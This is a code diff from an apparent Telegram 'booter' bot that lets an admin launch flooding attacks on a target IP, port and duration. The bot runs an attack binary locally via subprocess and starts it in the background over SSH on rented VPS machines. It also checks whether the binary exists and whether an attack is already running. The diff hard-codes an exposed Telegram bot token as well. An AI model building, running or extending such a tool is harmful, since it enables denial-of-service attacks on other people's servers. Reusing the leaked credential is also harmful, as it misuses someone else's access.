@@ -26,7 +26,7 @@ import paramiko  # For SSH and SCP connections
 
 # Bot Setup
 
-API_TOKEN = '7890188377:AAHCcPKmSCh7UDvIkttpNnlaOGFzTqJ7fmU'
+API_TOKEN = '7890188377:AAHLdCvj8MsKk-65mEOvad6dXakU38YYk3s'
 
 ADMIN_ID = ["6539807903"]
 
@@ -288,7 +288,7 @@ def start_attack_reply(message, target, port, duration):
 
     # Start the actual attack using subprocess
 
-    subprocess.run(f"./mrin {target} {port} {duration} 300", shell=True)
+    subprocess.run(f"./bgmi {target} {port} {duration}", shell=True)
 
     
 
@@ -1088,7 +1088,7 @@ def check_vps_status(vps_name):
 
         # Check if attack binary exists and is executable
 
-        stdin, stdout, stderr = ssh.exec_command("ls -la Alone/RAJ")
+        stdin, stdout, stderr = ssh.exec_command("ls -la Alone/bgmi")
 
         output = stdout.read().decode().strip()
 
@@ -1108,7 +1108,7 @@ def check_vps_status(vps_name):
 
         # Check if attack is already running
 
-        stdin, stdout, stderr = ssh.exec_command("ps aux | grep RAJ | grep -v grep")
+        stdin, stdout, stderr = ssh.exec_command("ps aux | grep bgmi | grep -v grep")
 
         running_processes = stdout.read().decode().strip()
 
@@ -1316,7 +1316,7 @@ def handle_vps_selection(message):
 
 
 
-        command = f"cd Alone && nohup ./mrin {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']} 300 > /dev/null 2>&1 &"
+        command = f"cd Alone && nohup ./bgmi {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']}  > /dev/null 2>&1 &"
 
         ssh.exec_command(command)
 
